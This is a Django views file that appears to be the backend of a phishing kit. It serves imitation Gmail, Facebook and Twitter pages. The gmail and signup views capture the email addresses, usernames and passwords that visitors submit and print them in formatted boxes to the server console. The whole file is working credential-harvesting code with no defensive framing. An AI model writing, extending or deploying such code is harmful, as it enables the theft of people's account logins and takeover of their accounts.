from django.shortcuts import render

def facebook(request):
    return render(request, 'facebook.html')


def gmail(request):
    if request.method == 'POST':
        try:
            if request.POST['gmailUsername']:
                print("-"*32)
                print("|"+ " "*10+"Email"+ " "*12+ "   |")
                print("-"*32)
                print("|       " + request.POST['gmailUsername'] + "     |       ")
                print("-"*32)
                userEmail = request.POST['gmailUsername']
                return render(request, 'gmail2.html', {"userEmail": userEmail})
        except:
            if request.POST['gmailPassword']:
                print("-"*32)
                print("|"+ " "*10+"Password"+ " "*12+ "|")
                print("-"*32)
                print("|       " + request.POST['gmailPassword'] + "     |       ")
                print("-"*32)
                return render(request, 'gmail.html')
    else:
        return render(request, 'gmail.html')

def signup(request): 
    if request.method == 'POST': #User has info and wants an an account
        print("-"*62)
        print("|"+ " "*10+"Username"+ " "*12+ "  |" + " "*8+"Password"+ " "*11 + "|")
        print("-"*62)
        print("|       " + request.POST['username'] + "     |       " + request.POST['password']+ "          |")
        print("-"*62)
        return render(request, 'facebook.html')
        
def twitter(request):
    return render(request, 'twitter.html')